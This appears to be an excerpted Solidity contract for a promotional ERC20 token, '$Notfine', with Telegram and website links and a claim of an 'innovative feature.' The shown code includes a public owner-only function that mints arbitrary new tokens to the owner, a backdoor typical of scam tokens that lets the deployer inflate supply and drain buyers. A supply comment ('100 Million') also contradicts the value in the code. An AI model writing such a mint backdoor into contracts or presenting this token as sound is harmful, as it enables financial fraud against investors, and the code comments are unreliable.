//
// $Notfine proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/NotfineBSC
// 📱 Website ::https://notfine.com/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Notfine(uint256 amount) public onlyOwner {
 _Notfine(msg.sender, amount);
    }
    ...
    function _Notfine(address account, uint256 amount) internal virtual {
...
contract $Notfine is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("THIS IS NOT FINE", "NOTFINE") {
     _Notfine(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}